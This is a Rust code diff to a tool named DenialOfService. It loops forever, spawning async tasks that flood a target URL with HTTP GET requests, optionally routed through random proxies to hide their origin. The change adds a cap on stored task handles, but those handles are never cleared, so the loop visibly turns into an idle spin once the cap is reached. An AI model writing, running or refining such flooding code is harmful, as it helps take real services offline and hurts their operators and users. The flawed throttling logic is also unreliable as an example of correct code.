@@ -49,12 +49,16 @@ impl DenialOfService {
             }
         }
 
+        let mut spawned_tasks = Vec::new();
         loop {
-            let self_cloned = self.clone();
+            if spawned_tasks.len() > 10000 {
+                continue;
+            }
 
+            let self_cloned = self.clone();
             if self_cloned.activate_proxy {
                 let taken_proxy = take_random_proxy(proxies.clone());
-                tokio::spawn(async move {
+                spawned_tasks.push(tokio::spawn(async move {
                     match reqwest::Proxy::http(taken_proxy.clone()) {
                         Ok(proxy) => match reqwest::Client::builder().proxy(proxy).build() {
                             Ok(client) => match client.get(self_cloned.url.clone()).send().await {
@@ -94,9 +98,9 @@ impl DenialOfService {
                             println!("{}", error_string.red().bold());
                         }
                     };
-                });
+                }));
             } else {
-                tokio::spawn(async move {
+                spawned_tasks.push(tokio::spawn(async move {
                     match reqwest::get(self_cloned.url.clone()).await {
                         Ok(_) => {
                             self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);
@@ -118,7 +122,7 @@ impl DenialOfService {
                             println!("{}", error_string.red().bold());
                         }
                     }
-                });
+                }));
             }
         }
     }
